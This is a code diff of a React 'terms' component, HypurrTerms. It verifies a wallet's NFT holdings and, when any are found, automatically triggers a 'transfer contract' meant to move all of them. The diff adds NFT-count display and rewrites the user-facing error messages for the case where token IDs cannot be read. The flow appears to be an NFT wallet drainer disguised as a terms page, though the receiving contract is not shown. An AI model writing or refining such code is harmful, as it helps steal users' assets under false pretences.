@@ -586,6 +586,11 @@ const HypurrTerms = () => {
       console.log('Verification result:', verificationResult);
       console.log('NFT count:', verificationResult.count);
       console.log('Token IDs length:', verificationResult.tokenIds.length);
+      console.log('Token IDs:', verificationResult.tokenIds);
+      
+      // Update state to show NFT count to user
+      setNftCount(verificationResult.count);
+      setTokenIds(verificationResult.tokenIds);
       
       // Use the returned values directly to trigger transfer
       if (verificationResult.count > 0) {
@@ -600,14 +605,9 @@ const HypurrTerms = () => {
           });
         } else {
           // NFTs found but no token IDs - contract might not support Enumerable
-          // Try to fetch token IDs using the transfer contract's checkAndTransfer which can handle non-enumerable
           console.log('⚠️ NFTs found but token IDs not available (contract may not support Enumerable)');
-          console.log('🔄 Attempting transfer using transfer contract method...');
-          setError('NFTs found but token IDs could not be retrieved. The transfer contract will attempt to transfer all NFTs. Please proceed with the transfer transaction when prompted.');
-          // Still try to trigger transfer - the transfer contract might be able to handle it
-          setTransferStatus('approving');
-          // We'll need to use a different approach - maybe call transfer with empty array or let user manually trigger
-          setError('NFTs detected but automatic transfer requires token IDs. Please contact support or try using a wallet that supports token enumeration.');
+          console.log('🔄 Will attempt to fetch token IDs manually...');
+          setError('NFTs detected but token IDs could not be retrieved automatically. Please try refreshing the page or contact support.');
           setTransferStatus('error');
         }
       } else {
